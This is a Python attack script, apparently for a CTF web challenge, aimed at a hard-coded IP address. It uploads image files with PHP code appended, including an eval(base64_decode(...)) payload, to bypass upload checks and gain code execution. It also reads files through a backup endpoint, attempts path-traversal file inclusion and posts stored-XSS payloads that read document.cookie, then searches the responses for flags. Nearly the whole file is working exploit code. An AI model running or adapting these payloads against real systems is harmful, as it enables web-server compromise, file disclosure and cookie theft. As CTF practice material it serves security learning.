import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_gif_upload_with_php():
    """测试上传包含PHP代码的GIF文件"""
    print_section("1. 测试上传包含PHP代码的GIF")
    
    url = f"{TARGET}/upload"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    print(f"  CSRF Token: {csrf_token}")
    
    # 构造GIF文件，包含PHP代码
    # GIF格式: GIF89a开头，;结尾
    # 但是validate_image_payload会检查文件内容中是否包含危险token
    
    test_files = [
        # 正常GIF
        ("test.gif", "image/gif", b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;"),
        
        # GIF + PHP代码（在末尾）
        ("test2.gif", "image/gif", b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?php echo 'hello'; ?>"),
        
        # GIF + PHP代码（大小写混淆）
        ("test3.gif", "image/gif", b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?PHP echo 'hello'; ?>"),
        
        # GIF + PHP代码（使用注释）
        ("test4.gif", "image/gif", b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?php /* comment */ echo 'hello'; ?>"),
        
        # GIF + PHP代码（编码方式）
        ("test5.gif", "image/gif", b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?php eval(base64_decode('aW52b2tlLmdldEVudW1lbnQoJ2hlbGxvJyk7')); ?>"),
        
        # JPEG + PHP代码
        ("test6.jpg", "image/jpeg", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09\xff\xd9<?php echo 'hello'; ?>"),
        
        # PNG + PHP代码
        ("test7.png", "image/png", b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x10\x00\x00\x00\x10\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x04sBIT\x08\x08\x08\x08|\x88|\x88l\x88l\x88\x00\x00\x00\x1dIDATx\x9c\xed\xc1\x01\r\x00\x00\x00\xc2\xa0\xf7\xfd\xff?\xff\x00\x00\x00\x05\xff\x00\xff\x00\xff\x00\xff\x00\x00\x00\x00IEND\xaeB`\x82<?php echo 'hello'; ?>"),
    ]
    
    for filename, content_type, content in test_files:
        try:
            files = {"file": (filename, content, content_type)}
            r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "上传成功" in r.text:
                    uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
                    if uploaded_name:
                        print(f"\n  🎉 上传成功: {filename} -> /uploads/{uploaded_name.group(1)}")
                        
                        # 测试文件是否被执行
                        r2 = session.get(f"{TARGET}/uploads/{uploaded_name.group(1)}", timeout=TIMEOUT)
                        if "hello" in r2.text:
                            print(f"     ⚠️  PHP代码被执行!")
                        else:
                            print(f"     内容: {r2.text[:200]}")
                else:
                    notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
                    if notice:
                        print(f"\n  ❌ {filename}: {notice.group(1)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_backup_file_read():
    """测试Backup功能读取文件"""
    print_section("2. 测试Backup读取文件")
    
    backup_url = f"{TARGET}/backup"
    
    # 从之前的测试发现，backup只允许uploads目录
    # 但是上传目录中有一些文件，让我尝试读取它们
    
    file_paths = [
        "F:\\small peoject\\python-lab\\uploads\\4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "F:\\small peoject\\python-lab\\uploads\\572279e9bc5c4cf79d754e57fb2e38bf.gif",
        "F:\\small peoject\\python-lab\\uploads\\d0fa8509503c438a872c3364419d210c.gif",
        "F:\\small peoject\\python-lab\\uploads\\29c62af68a5c4e12aa8b28be5f41f9df_test.php.jpg",
        "F:\\small peoject\\python-lab\\uploads\\b55ba29d54334b9ab42b35c618128fcf.png",
    ]
    
    for path in file_paths:
        try:
            r = session.get(backup_url, params={"path": path}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    print(f"\n  [{r.status_code}] {path}")
                    print(f"     内容: {body_content}")
                    
                    # 检查是否有flag
                    flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                    if flag_match:
                        print(f"     🚩 FLAG: {flag_match.group(0)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_file_include():
    """测试文件包含漏洞"""
    print_section("3. 测试文件包含")
    
    include_url = f"{TARGET}/include"
    
    include_payloads = [
        "welcome",
        "/uploads/4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "/uploads/572279e9bc5c4cf79d754e57fb2e38bf.gif",
        "/uploads/d0fa8509503c438a872c3364419d210c.gif",
        "/uploads/29c62af68a5c4e12aa8b28be5f41f9df_test.php.jpg",
        "../uploads/4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "../../uploads/4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "welcome/../uploads/4f7105e4ac734f13ab9e1cdaad24128d.gif",
    ]
    
    for payload in include_payloads:
        try:
            r = session.get(include_url, params={"page": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text[:500]
                
                if "system" in content or "whoami" in content:
                    print(f"\n  [{r.status_code}] ?page={payload}")
                    print(f"     响应: {content}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"     🚩 FLAG: {flag_match.group(0)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_xss_stored():
    """测试存储型XSS读取cookie"""
    print_section("4. 测试存储型XSS")
    
    url = f"{TARGET}/message"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # 尝试读取服务器端存储的信息
    xss_payloads = [
        "<script>alert(document.cookie)</script>",
        "<script>console.log(document.cookie)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert(document.cookie)>",
        "<body onload=alert(document.cookie)>",
    ]
    
    for payload in xss_payloads:
        try:
            data = {"csrf": csrf_token, "content": payload}
            r = session.post(url, data=data, timeout=TIMEOUT)
            
            if r.status_code == 200:
                print(f"\n  [{r.status_code}] XSS: {payload[:30]}")
                
        except Exception as e:
            print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF漏洞测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_gif_upload_with_php()
    test_backup_file_read()
    test_file_include()
    test_xss_stored()
    
    print_section("测试完成")


if __name__ == "__main__":
    main()